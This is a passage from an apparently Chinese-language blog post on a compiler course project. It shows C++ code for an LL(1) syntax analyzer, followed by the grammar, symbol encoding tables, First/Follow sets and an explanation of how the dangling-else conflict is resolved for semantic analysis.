class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isVT</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(n&gt;=<span class="number">100</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">isEmpty</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(n==<span class="number">128</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">getPush</span><span class="params">(vector&lt;<span class="type">int</span>&gt; V)</span></span>&#123;        <span class="comment">// 逐个入栈</span></span><br><span class="line">            <span class="type">int</span> len = V.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">                S.<span class="built_in">push</span>(V[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="type">bool</span> <span class="title">analyze</span><span class="params">()</span></span>&#123;</span><br><span class="line">            S.<span class="built_in">push</span>(<span class="number">-1</span>);     <span class="comment">// 终止符</span></span><br><span class="line">            S.<span class="built_in">push</span>(<span class="number">100</span>);      <span class="comment">// 起始符A</span></span><br><span class="line">            <span class="type">int</span> len = typeV.<span class="built_in">size</span>(), c=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(!S.<span class="built_in">empty</span>() &amp;&amp; c&lt;len)&#123;</span><br><span class="line">                <span class="type">int</span> tmp = S.<span class="built_in">top</span>();</span><br><span class="line">                S.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isEmpty</span>(tmp))&#123;   <span class="comment">// 空串跳过</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isVT</span>(tmp))&#123;  <span class="comment">// 非终结符</span></span><br><span class="line">                    <span class="function">pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; <span class="title">tmpP</span><span class="params">(tmp, typeV[c]<span class="number">-1</span>)</span></span>;</span><br><span class="line">                    <span class="keyword">if</span>(init.<span class="built_in">count</span>(tmpP)==<span class="number">0</span>)&#123;    <span class="comment">// 语法错误</span></span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;false with unknown: %d (%d,%s)&quot;</span>, tmp, typeV[c]<span class="number">-1</span>, strV[c].<span class="built_in">c_str</span>());</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    vector&lt;<span class="type">int</span>&gt; tmpV = init[tmpP];</span><br><span class="line">                    <span class="built_in">getPush</span>(tmpV);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;    <span class="comment">// 终结符</span></span><br><span class="line">                    <span class="keyword">if</span>(tmp!=typeV[c]<span class="number">-1</span>)&#123;    <span class="comment">// 语法错误</span></span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;false with: %d (%d,%s)&quot;</span>, tmp, typeV[c]<span class="number">-1</span>, strV[c].<span class="built_in">c_str</span>());</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;true: (%d,%s)\n&quot;</span>, typeV[c]<span class="number">-1</span>, strV[c].<span class="built_in">c_str</span>());</span><br><span class="line">                        ++c;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!S.<span class="built_in">empty</span>()) <span class="built_in">printf</span>(<span class="string">&quot;stack!&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(c&lt;len) <span class="built_in">printf</span>(<span class="string">&quot;vector!&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;all true!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    wordsAnalyzer *wA = <span class="keyword">new</span> <span class="built_in">wordsAnalyzer</span>(<span class="number">1</span>);</span><br><span class="line">    wA-&gt;<span class="built_in">printSplit</span>(<span class="string">&quot;Lexical Analysis&quot;</span>);</span><br><span class="line">    wA-&gt;<span class="built_in">analyze</span>();</span><br><span class="line">    grammarAnalyzer *gA = <span class="keyword">new</span> <span class="built_in">grammarAnalyzer</span>(wA-&gt;<span class="built_in">getTV</span>(), wA-&gt;<span class="built_in">getSV</span>());</span><br><span class="line">    gA-&gt;<span class="built_in">analyze</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Semantic-Analysis"><a href="#Semantic-Analysis" class="headerlink" title="Semantic Analysis"></a>Semantic Analysis</h2><h3 id="LL-1-文法-1"><a href="#LL-1-文法-1" class="headerlink" title="LL(1)文法"></a>LL(1)文法</h3><p><em>递归下降是语义分析最直观的解决方式，仍然使用LL(1)文法解决</em></p>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li><p>产生式集合与语法分析稍有不同，多加了 <code>&amp;&amp;</code> 和 <code>||</code> ，以及if后不一定要跟着else：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;程序&gt; -&gt; program&lt;标识符&gt;;&lt;分程序&gt;</span><br><span class="line">&lt;分程序&gt; -&gt; &lt;变量说明&gt;begin&lt;语句表&gt;end.</span><br><span class="line">&lt;变量说明&gt; -&gt; var&lt;变量说明表&gt;</span><br><span class="line">&lt;变量说明表&gt; -&gt; &lt;变量表&gt;:&lt;类型&gt;;&lt;后变量说明表&gt;</span><br><span class="line">&lt;后变量说明表&gt; -&gt; &lt;变量说明表&gt; | &lt;空&gt;</span><br><span class="line">&lt;类型&gt; -&gt; integer | real</span><br><span class="line">&lt;变量表&gt; -&gt; &lt;变量&gt;&lt;后变量表&gt;</span><br><span class="line">&lt;后变量表&gt; -&gt; ,&lt;变量表&gt; | &lt;空&gt;</span><br><span class="line">&lt;语句表&gt; -&gt; &lt;语句&gt;&lt;后语句表&gt;</span><br><span class="line">&lt;后语句表&gt; -&gt; ;&lt;语句表&gt; | &lt;空&gt;</span><br><span class="line">&lt;语句&gt; -&gt; &lt;赋值语句&gt; | &lt;条件语句&gt; | &lt;WHILE语句&gt; | &lt;复合语句&gt;</span><br><span class="line">&lt;赋值语句&gt; -&gt; &lt;变量&gt;:=&lt;算术表达式&gt;</span><br><span class="line">&lt;条件语句&gt; -&gt; if&lt;关系表达式&gt;then&lt;语句&gt;&lt;后条件语句&gt;</span><br><span class="line">&lt;后条件语句&gt; -&gt; &lt;空&gt; | else&lt;语句&gt;</span><br><span class="line">&lt;WHILE语句&gt; -&gt; while&lt;关系表达式&gt;do&lt;语句&gt;</span><br><span class="line">&lt;复合语句&gt; -&gt; begin&lt;语句表&gt;end</span><br><span class="line">&lt;算术表达式&gt; -&gt; &lt;项&gt;&lt;替算术表达式&gt;</span><br><span class="line">&lt;替算术表达式&gt; -&gt; &lt;另算术表达式&gt; | &lt;空&gt;</span><br><span class="line">&lt;另算术表达式&gt; -&gt; &lt;后算术表达式&gt;&lt;另算术表达式&gt; | &lt;空&gt;</span><br><span class="line">&lt;后算术表达式&gt; -&gt; +&lt;项&gt; | -&lt;项&gt;</span><br><span class="line">&lt;项&gt; -&gt; &lt;因式&gt;&lt;替项&gt;</span><br><span class="line">&lt;替项&gt; -&gt; &lt;另项&gt; | &lt;空&gt;</span><br><span class="line">&lt;另项&gt; -&gt; &lt;后项&gt;&lt;另项&gt; | &lt;空&gt;</span><br><span class="line">&lt;后项&gt; -&gt; *&lt;因式&gt; | /&lt;因式&gt;</span><br><span class="line">&lt;因式&gt; -&gt; &lt;变量&gt; | &lt;常数&gt; | (&lt;算术表达式&gt;)</span><br><span class="line">&lt;关系表达式&gt; -&gt; &lt;子关系表达式&gt;&lt;后子关系表达式&gt;</span><br><span class="line">&lt;子关系表达式&gt; -&gt; &lt;算术表达式&gt;&lt;关系符&gt;&lt;算术表达式&gt;</span><br><span class="line">&lt;后子关系表达式&gt; -&gt; &lt;逻辑运算符&gt;&lt;关系表达式&gt; | &lt;空&gt;</span><br><span class="line">&lt;逻辑运算符&gt; -&gt; &amp;&amp; | ||</span><br><span class="line">&lt;变量&gt; -&gt; &lt;标识符&gt;</span><br><span class="line">&lt;常数&gt; -&gt; &lt;整数&gt; | &lt;浮点数&gt;</span><br><span class="line">&lt;关系符&gt; -&gt; &lt; | &lt;= | = | &gt; | &gt;= | &lt;&gt;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>符号的机内表示：将推导式中的字母（1位字母过于有限）替换为数字来标记类型。（为了表示方便，展示推导式时仍保留字母）。将VN从100开始编号：</p>
<table>
<thead>
<tr>
<th align="center">VN</th>
<th align="center">Str</th>
<th>int</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&lt;程序&gt;</td>
<td align="center">A</td>
<td>100</td>
</tr>
<tr>
<td align="center">&lt;分程序&gt;</td>
<td align="center">B</td>
<td>101</td>
</tr>
<tr>
<td align="center">&lt;变量说明&gt;</td>
<td align="center">C</td>
<td>102</td>
</tr>
<tr>
<td align="center">&lt;变量说明表&gt;</td>
<td align="center">D</td>
<td>103</td>
</tr>
<tr>
<td align="center">&lt;类型&gt;</td>
<td align="center">E</td>
<td>104</td>
</tr>
<tr>
<td align="center">&lt;变量表&gt;</td>
<td align="center">F</td>
<td>105</td>
</tr>
<tr>
<td align="center">&lt;语句表&gt;</td>
<td align="center">G</td>
<td>106</td>
</tr>
<tr>
<td align="center">&lt;语句&gt;</td>
<td align="center">H</td>
<td>107</td>
</tr>
<tr>
<td align="center">&lt;赋值语句&gt;</td>
<td align="center">I</td>
<td>108</td>
</tr>
<tr>
<td align="center">&lt;条件语句&gt;</td>
<td align="center">J</td>
<td>109</td>
</tr>
<tr>
<td align="center">&lt;WHILE语句&gt;</td>
<td align="center">K</td>
<td>110</td>
</tr>
<tr>
<td align="center">&lt;复合语句&gt;</td>
<td align="center">L</td>
<td>111</td>
</tr>
<tr>
<td align="center">&lt;算术表达式&gt;</td>
<td align="center">M</td>
<td>112</td>
</tr>
<tr>
<td align="center">&lt;替算术表达式&gt;</td>
<td align="center">N</td>
<td>113</td>
</tr>
<tr>
<td align="center">&lt;另算术表达式&gt;</td>
<td align="center">O</td>
<td>114</td>
</tr>
<tr>
<td align="center">&lt;后算术表达式&gt;</td>
<td align="center">P</td>
<td>115</td>
</tr>
<tr>
<td align="center">&lt;项&gt;</td>
<td align="center">Q</td>
<td>116</td>
</tr>
<tr>
<td align="center">&lt;另项&gt;</td>
<td align="center">R</td>
<td>117</td>
</tr>
<tr>
<td align="center">&lt;后项&gt;</td>
<td align="center">S</td>
<td>118</td>
</tr>
<tr>
<td align="center">&lt;因式&gt;</td>
<td align="center">T</td>
<td>119</td>
</tr>
<tr>
<td align="center">&lt;关系表达式&gt;</td>
<td align="center">U</td>
<td>120</td>
</tr>
<tr>
<td align="center">&lt;变量&gt;</td>
<td align="center">V</td>
<td>121</td>
</tr>
<tr>
<td align="center">&lt;常数&gt;</td>
<td align="center">W</td>
<td>122</td>
</tr>
<tr>
<td align="center">&lt;关系符&gt;</td>
<td align="center">X</td>
<td>123</td>
</tr>
<tr>
<td align="center">&lt;后变量说明表&gt;</td>
<td align="center">Y</td>
<td>124</td>
</tr>
<tr>
<td align="center">&lt;后变量表&gt;</td>
<td align="center">Z</td>
<td>125</td>
</tr>
<tr>
<td align="center">&lt;后语句表&gt;</td>
<td align="center">A<del>1</del></td>
<td>126</td>
</tr>
<tr>
<td align="center">&lt;替项&gt;</td>
<td align="center">B<del>1</del></td>
<td>127</td>
</tr>
<tr>
<td align="center">&lt;空&gt;</td>
<td align="center">C<del>1</del></td>
<td>128</td>
</tr>
<tr>
<td align="center">&lt;后条件语句&gt;</td>
<td align="center">D<del>1</del></td>
<td>129</td>
</tr>
<tr>
<td align="center">&lt;子关系表达式&gt;</td>
<td align="center">E<del>1</del></td>
<td>130</td>
</tr>
<tr>
<td align="center">&lt;后子关系表达式&gt;</td>
<td align="center">F<del>1</del></td>
<td>131</td>
</tr>
<tr>
<td align="center">&lt;逻辑运算符&gt;</td>
<td align="center">G<del>1</del></td>
<td>132</td>
</tr>
</tbody></table>
<p>列出VT（不考虑 <code>&amp;&amp;</code> 、<code>||</code> 、<code>until</code> 、<code>for</code> 、<code>repeat</code> 、<code>!</code> ）：</p>
<table>
<thead>
<tr>
<th align="center">VT</th>
<th align="center">STR</th>
<th align="center">INt</th>
</tr>
</thead>
<tbody><tr>
<td align="center">program</td>
<td align="center">a</td>
<td align="center">0</td>
</tr>
<tr>
<td align="center">var</td>
<td align="center">b</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">integer</td>
<td align="center">c</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">real</td>
<td align="center">d</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">begin</td>
<td align="center">e</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">end</td>
<td align="center">f</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">if</td>
<td align="center">g</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">then</td>
<td align="center">h</td>
<td align="center">7</td>
</tr>
<tr>
<td align="center">else</td>
<td align="center">i</td>
<td align="center">8</td>
</tr>
<tr>
<td align="center">while</td>
<td align="center">j</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">do</td>
<td align="center">k</td>
<td align="center">10</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">l</td>
<td align="center">20</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">m</td>
<td align="center">21</td>
</tr>
<tr>
<td align="center">*</td>
<td align="center">n</td>
<td align="center">22</td>
</tr>
<tr>
<td align="center">&#x2F;</td>
<td align="center">o</td>
<td align="center">23</td>
</tr>
<tr>
<td align="center">&gt;</td>
<td align="center">p</td>
<td align="center">24</td>
</tr>
<tr>
<td align="center">&gt;&#x3D;</td>
<td align="center">q</td>
<td align="center">25</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">r</td>
<td align="center">26</td>
</tr>
<tr>
<td align="center">&lt;&#x3D;</td>
<td align="center">s</td>
<td align="center">27</td>
</tr>
<tr>
<td align="center">&#x3D;</td>
<td align="center">t</td>
<td align="center">28</td>
</tr>
<tr>
<td align="center">&lt;&gt;</td>
<td align="center">u</td>
<td align="center">29</td>
</tr>
<tr>
<td align="center">:&#x3D;</td>
<td align="center">v</td>
<td align="center">30</td>
</tr>
<tr>
<td align="center">&lt;整数&gt;</td>
<td align="center">w</td>
<td align="center">40</td>
</tr>
<tr>
<td align="center">&lt;浮点数&gt;</td>
<td align="center">x</td>
<td align="center">41</td>
</tr>
<tr>
<td align="center">&lt;标识符&gt;</td>
<td align="center">y</td>
<td align="center">44</td>
</tr>
<tr>
<td align="center">;</td>
<td align="center">z</td>
<td align="center">50</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">a<del>1</del></td>
<td align="center">51</td>
</tr>
<tr>
<td align="center">,</td>
<td align="center">b<del>1</del></td>
<td align="center">52</td>
</tr>
<tr>
<td align="center">:</td>
<td align="center">c<del>1</del></td>
<td align="center">53</td>
</tr>
<tr>
<td align="center">(</td>
<td align="center">d<del>1</del></td>
<td align="center">54</td>
</tr>
<tr>
<td align="center">)</td>
<td align="center">e<del>1</del></td>
<td align="center">55</td>
</tr>
<tr>
<td align="center">&amp;&amp;</td>
<td align="center">f<del>1</del></td>
<td align="center">31</td>
</tr>
<tr>
<td align="center">||</td>
<td align="center">g<del>1</del></td>
<td align="center">32</td>
</tr>
</tbody></table>
</li>
<li><p>First集与Follow集：</p>
<table>
<thead>
<tr>
<th align="center">VN</th>
<th align="center">产生式</th>
<th align="center">First</th>
<th align="center">follow</th>
<th align="center">产生式（入栈数字）</th>
</tr>
</thead>
<tbody><tr>
<td align="center">A</td>
<td align="center">A-&gt;ayzB</td>
<td align="center">a</td>
<td align="center">#</td>
<td align="center">101, 50, 44, 0</td>
</tr>
<tr>
<td align="center">B</td>
<td align="center">B-&gt;CeGfa<del>1</del></td>
<td align="center">b</td>
<td align="center">#</td>
<td align="center">51, 5, 106, 4, 102</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">C-&gt;bD</td>
<td align="center">b</td>
<td align="center">e</td>
<td align="center">103, 1</td>
</tr>
<tr>
<td align="center">D</td>
<td align="center">D-&gt;Fc<del>1</del>EzY</td>
<td align="center">y</td>
<td align="center">e</td>
<td align="center">124, 50, 104, 53, 105</td>
</tr>
<tr>
<td align="center">Y</td>
<td align="center">Y-&gt;D</td>
<td align="center">y</td>
<td align="center">e</td>
<td align="center">103</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Y-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">E</td>
<td align="center">E-&gt;c</td>
<td align="center">c</td>
<td align="center">z</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">E-&gt;d</td>
<td align="center">d</td>
<td align="center"></td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">F-&gt;VZ</td>
<td align="center">y</td>
<td align="center">c<del>1</del></td>
<td align="center">125, 121</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">Z-&gt;b<del>1</del>F</td>
<td align="center">b<del>1</del></td>
<td align="center">c<del>1</del></td>
<td align="center">105, 52</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">Z-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">G</td>
<td align="center">G-&gt;HA<del>1</del></td>
<td align="center">y,g,j,e</td>
<td align="center">f</td>
<td align="center">126, 107</td>
</tr>
<tr>
<td align="center">A<del>1</del></td>
<td align="center">A<del>1</del>-&gt;zG</td>
<td align="center">z</td>
<td align="center">f</td>
<td align="center">106, 50</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">A<del>1</del>-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">H</td>
<td align="center">H-&gt;I</td>
<td align="center">y</td>
<td align="center">z, f, i</td>
<td align="center">108</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">H-&gt;J</td>
<td align="center">g</td>
<td align="center"></td>
<td align="center">109</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">H-&gt;K</td>
<td align="center">j</td>
<td align="center"></td>
<td align="center">110</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">H-&gt;L</td>
<td align="center">e</td>
<td align="center"></td>
<td align="center">111</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">I-&gt;VvM</td>
<td align="center">y</td>
<td align="center">z, f, i</td>
<td align="center">112, 30, 121</td>
</tr>
<tr>
<td align="center">J</td>
<td align="center">J-&gt;gUhHD<del>1</del></td>
<td align="center">g</td>
<td align="center">z, f, i</td>
<td align="center">129, 107, 7, 120, 6</td>
</tr>
<tr>
<td align="center">D<del>1</del></td>
<td align="center">D<del>1</del>-&gt;iH</td>
<td align="center">i</td>
<td align="center">z, f, (i)</td>
<td align="center">107, 8</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">D<del>1</del>-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">K</td>
<td align="center">K-&gt;jUkH</td>
<td align="center">j</td>
<td align="center">z, f, i</td>
<td align="center">107, 10, 120, 9</td>
</tr>
<tr>
<td align="center">L</td>
<td align="center">L-&gt;eGf</td>
<td align="center">e</td>
<td align="center">z, f, i</td>
<td align="center">5, 106, 4</td>
</tr>
<tr>
<td align="center">M</td>
<td align="center">M-&gt;QN</td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">113, 116</td>
</tr>
<tr>
<td align="center">N</td>
<td align="center">N-&gt;O</td>
<td align="center">l,m</td>
<td align="center">z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">114</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">N-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">O</td>
<td align="center">O-&gt;PO</td>
<td align="center">l,m</td>
<td align="center">z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">114, 115</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">O-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">P</td>
<td align="center">P-&gt;lQ</td>
<td align="center">l</td>
<td align="center">l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">116, 20</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">P-&gt;mQ</td>
<td align="center">m</td>
<td align="center"></td>
<td align="center">116, 21</td>
</tr>
<tr>
<td align="center">Q</td>
<td align="center">Q-&gt;TB<del>1</del></td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">127, 119</td>
</tr>
<tr>
<td align="center">B<del>1</del></td>
<td align="center">B<del>1</del>-&gt;R</td>
<td align="center">n,o</td>
<td align="center">l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">117</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">B<del>1</del>-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">R-&gt;SR</td>
<td align="center">n,o</td>
<td align="center">l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">117, 118</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">R-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">S-&gt;nT</td>
<td align="center">n</td>
<td align="center">n, o, l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">119, 22</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">S-&gt;oT</td>
<td align="center">o</td>
<td align="center"></td>
<td align="center">119, 23</td>
</tr>
<tr>
<td align="center">T</td>
<td align="center">T-&gt;V</td>
<td align="center">y</td>
<td align="center">n, o, l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">121</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">T-&gt;W</td>
<td align="center">w,x</td>
<td align="center"></td>
<td align="center">122</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">T-&gt;d<del>1</del>Me<del>1</del></td>
<td align="center">d<del>1</del></td>
<td align="center"></td>
<td align="center">55, 112, 54</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">U-&gt;E<del>1</del>F<del>1</del></td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">k, h</td>
<td align="center">131, 130</td>
</tr>
<tr>
<td align="center">E<del>1</del></td>
<td align="center">E<del>1</del>-&gt;MXM</td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">k, h, f<del>1</del></td>
<td align="center">112, 123, 112</td>
</tr>
<tr>
<td align="center">F<del>1</del></td>
<td align="center">F<del>1</del>-&gt;G<del>1</del>U</td>
<td align="center">f<del>1</del>,g<del>1</del></td>
<td align="center">k, h</td>
<td align="center">120, 132</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">F<del>1</del>-&gt;&lt;空&gt;</td>
<td align="center">&lt;空&gt;</td>
<td align="center"></td>
<td align="center">128</td>
</tr>
<tr>
<td align="center">G<del>1</del></td>
<td align="center">G<del>1</del>-&gt;f<del>1</del></td>
<td align="center">f<del>1</del></td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">31</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">G<del>1</del>-&gt;g<del>1</del></td>
<td align="center">g<del>1</del></td>
<td align="center"></td>
<td align="center">32</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">V-&gt;y</td>
<td align="center">y</td>
<td align="center">n, o, l, m, z, f, i, p, q, r, s, t, u, v, b<del>1</del>, c<del>1</del>, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">44</td>
</tr>
<tr>
<td align="center">W</td>
<td align="center">W-&gt;w</td>
<td align="center">w</td>
<td align="center">n, o, l, m, z, f, i, p, q, r, s, t, u, h, k, e<del>1</del>, f<del>1</del>, g<del>1</del></td>
<td align="center">40</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">W-&gt;x</td>
<td align="center">x</td>
<td align="center"></td>
<td align="center">41</td>
</tr>
<tr>
<td align="center">X</td>
<td align="center">X-&gt;p</td>
<td align="center">p</td>
<td align="center">y,w,x,d<del>1</del></td>
<td align="center">24</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;q</td>
<td align="center">q</td>
<td align="center"></td>
<td align="center">25</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;r</td>
<td align="center">r</td>
<td align="center"></td>
<td align="center">26</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;s</td>
<td align="center">s</td>
<td align="center"></td>
<td align="center">27</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;t</td>
<td align="center">t</td>
<td align="center"></td>
<td align="center">28</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">X-&gt;u</td>
<td align="center">u</td>
<td align="center"></td>
<td align="center">29</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<p>需要注意的是产生式D<del>1</del>-&gt;iH，其Follow集合与First集合发生冲突了，按照LL(1)的分析步骤执行这个冲突消除不了，但实际上这个冲突并不成立。</p>
<p>会产生这个冲突，问题在于一个if语句与else的匹配原则。if总是匹配离他最近的else，<strong>除非</strong>它在复合语句中，if后紧跟end标明复合语句结束，下一个遇到的else才不属于该if，如：</p>
<div class="highlight-container" data-rel="Pascal"><figure class="iseeu highlight pascal"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> a&gt;<span class="number">5</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">	<span class="keyword">if</span> b&gt;<span class="number">5</span></span><br><span class="line">	<span class="keyword">then</span></span><br><span class="line">		b=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	a=<span class="number">1</span>;</span><br></pre></td></tr></table></figure></div>

<p>而if的产生式是由&lt;条件语句&gt;开始的，&lt;条件语句&gt;首先是一个&lt;语句&gt;，他可能是then后面的那个&lt;语句&gt;，因此它的后面可能跟有else，对应字母H的Follow集中有i；其次 <code>&lt;条件语句&gt; -&gt; if&lt;关系表达式&gt;then&lt;语句&gt;&lt;后条件语句&gt;</code> 对于后条件语句而言，他可能产生else，因此碰到else他应该：<code>&lt;后条件语句&gt;-&gt;else&lt;语句&gt;</code> ，但同时它又可能为&lt;空&gt;，而他为&lt;空&gt;时参考他上级的&lt;条件语句&gt;Follow集，不巧的是这个集合里也有else。也就是说按照LL(1)的基本分析思路，这个Follow集中的else起作用的场景原本是，&lt;后条件语句&gt;为空，然后上一级的&lt;条件语句&gt;匹配到它后面可能跟的else，也就是跟在这整个&lt;语句&gt;后面的属于之前if的else。</p>
<p>看似很有道理，但实际上这并不符合if与else的匹配规则，因为if总是匹配离他最近的else！试想如果&lt;后条件语句&gt;为空，那就意味着该式子中的if就是没有else的，那么他后面要么跟其他语句，要么跟end，不可能出现后面跟着一个else，而且这个else还属于别的if！</p>
<p>因此这里虽然Follow集合中有i，但是实际制表时只将i放入First集中处理，即匹配到的所有else都采用 <code>&lt;后条件语句&gt; -&gt; else&lt;语句&gt;</code> 产生式。 </p>
</li>
<li><p>递归栈的种类标记：</p>
<table>
<thead>
<tr>
<th align="center">层数</th>
<th align="center">标记</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">始末标记</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">1</td>
<td align="center">条件语句</td>
</tr>
<tr>
